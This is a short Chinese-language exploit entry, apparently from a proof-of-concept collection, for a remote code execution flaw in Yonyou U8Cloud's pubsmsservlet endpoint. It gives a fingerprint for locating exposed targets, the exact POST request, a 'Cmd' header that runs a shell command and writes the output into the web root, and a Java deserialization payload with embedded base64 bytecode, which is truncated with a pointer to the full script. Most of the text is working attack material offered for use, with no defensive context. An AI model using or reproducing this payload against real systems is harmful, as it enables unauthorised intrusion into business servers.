# 用友U8Cloudpubsmsservlet存在远程代码执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title=="U8C"`
- **请求**：`POST /servlet/pubsmsservlet HTTP/1.1`
- **关键头**：`Content-Type: application/xml`　`Cmd: whoami >./webapps/u8c_web/yu.txt`

**请求体 / payload**
```
<map>
<entry>
<org.springframework.aop.target.HotSwappableTargetSource>
<target class="com.fasterxml.jackson.databind.node.POJONode">
<__value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
<com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
<default>
<__name>ae62d68f-8c88-4ef9-895c-1bc8f9389640</__name>
<__bytecodes>
<byte-array>yv66vgAAADIBoAEAUW9yZy9hcGFjaGUvYmVhbnV0aWxzL2NveW90ZS9qc29uc2NoZW1hL0pzb25TY2hlbWFhMjQ0MGE5ZGVkOTI0OWRiODE1ZmI0YTBlZGE1MDA2ZgcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnN…（脚本共 12951 字，完整版见原文）
```
- **预期**：200　|　—